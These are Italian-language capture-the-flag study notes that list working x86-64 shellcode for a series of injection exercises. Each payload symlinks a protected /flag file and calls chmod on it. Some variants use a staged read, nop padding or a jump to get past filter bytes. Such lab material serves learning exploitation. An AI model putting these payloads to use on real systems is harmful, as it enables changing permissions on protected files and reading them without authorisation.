# Soluzioni da memorizzare

> [!Note]
>
> In generale per tutti gli esercizi di [**assembly**](##Assembly) e [**injection**](##inject) potrebbe essere necessario introdurre queste righe di codice
>
> ```python
> from pwn import *
> import subprocess
> 
> subprocess.run(["mkdir", "-p", "/tmp/pwntools-cache"])
> 
> context.arch = "x86-64"
> context.cache_dir = "/tmp/pwntools-cache"
> ```
>
> Questo potrebbe essere necessario per una questione di permessi in con cache di **pwntools**.

## Inject

Prima di tutto bisogna softlinkare la flag in ogni esercizio `ln -s /flag f`.

### es14

```assembly
    push rdx	# La prima parte del codice serve a performare la read
    pop rsi				 
    push rax
    pop rdi 
    syscall
.rept
    nop 
.endr
    push 0x66
    push rsp 
    pop rdi
    push 7
    pop rsi
    push 90 
    pop rax
    syscall
```

### es13

```assembly
 	push 0x66
    push rsp 
    pop rdi
    push 7
    pop rsi
    push 90 
    pop rax
    syscall
```

### es12

````assembly
    push 0x66
    pop rdi
    add eax, 90
    mov sil, 7
    syscall
````

### es11

```assembly
    push 0x66
    push rsp
    pop rdi
    push 7
    pop rsi
    push 90
    pop rax
    syscall
```

### es10

```assembly
    push 0x66
    push rsp 
    pop rdi
    push 7
    pop rsi
    push 90
    pop rax
    syscall
```

### es9

```assembly
    push 0x66
    push rsp 
    pop rdi
    push 7
    pop rsi
    jmp con
.rept 11	# Il salto deve essere fatto precisamente per evitare ogni istruzione int3
    nop
.endr
con:
    push 90
    pop rax
    syscall
```

### es8

```assembly
    push 0x66
    push rsp
    pop rdi
    push 7
    pop rsi
    push 90
    pop rax
    syscall
```



## Assembly

### es10

```assembly
    mov rax, [0x404000]
    mov rbx, [0x404000]
    add rbx, 0x1337
    mov [0x404000], rbx
```

